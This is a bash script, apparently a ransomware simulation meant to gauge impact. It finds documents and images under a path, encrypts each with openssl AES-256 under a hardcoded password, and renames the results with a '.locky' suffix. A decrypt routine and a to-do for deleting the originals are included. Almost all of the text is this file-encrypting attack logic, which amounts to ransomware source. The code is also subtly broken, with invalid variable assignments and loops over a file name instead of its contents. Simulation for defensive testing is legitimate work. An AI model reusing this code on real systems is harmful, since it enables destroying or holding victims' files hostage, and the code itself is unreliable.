#!/bin/bash
# Purpose:  Gauge impact and simulate a crypto malware attack
# Author: David Pratt
# Date: August, 2016
##############################################################

# declare variables
target_path=""
target_file=""
file_list=""
target_list=""
encrypted_file=""
decrypted_file=""
encrypted_file_list=""
file_suffix=".locky"
ciphertext="chuggles"
# set target file extensions in this array
declare -a target_types=(".docx" ".xlsx" ".txt" ".jpeg" ".png" ".jpg")

# TO DO: script usage

# TO DO: check mapped drives we have access to

# TO DO: find function - add logic for file count summary
# find_files description:
#   populates $file_list with all the files at the $target_path
#   using the $target_types[@] array, checks our file list for targets
#   and stores these targets in $target_list
function find_files {
    find $target_path -type f 2>/dev/null >> $file_list
    for extension in "${target_types[@]}"
    do
        grep $extension $file_list >> $target_list
    done
#count_docx=$(find . -type f -name '*.docx' 2>/dev/null |wc -l)
}


# TO DO: encrypt function - add logic to remove source files after encrypting
# encrypt_files description:
#   takes $target_list and encrypts each file using $ciphertext
#   files are read in and saved with a new file extension appended from $file_suffix
#   also, all encrypted files are appended in $encrypted_file_list
function encrypt_files {
    for line in $target_list
    do
        target_file = $line
        encrypted_file = $line.$file_suffix
        echo $encrypted_file >> $encrypted_file_list
        echo "Encrypting file..."
        echo "Target: $target_file"
        openssl enc -in $target_file -out $encrypted_file -e -aes256 -k $ciphertext
    done
}


# decrypt_files description:
#   takes $target_list and decrypts each file using $ciphertext
#   it is advised that you use the output from encrypt_files function
#   that is stored in $encrypted_file_list as the $target_list
function decrypt_files {
    for line in $target_list
    do
        target_file = $line
        decrypted_file = $( echo $line | sed "s#$file_suffix##" )
        echo "Decrypting file..."
        echo "Target: $target_file"
        openssl enc -in $target_file -out $decrypted_file -d -aes256 -k $ciphertext
    done
}

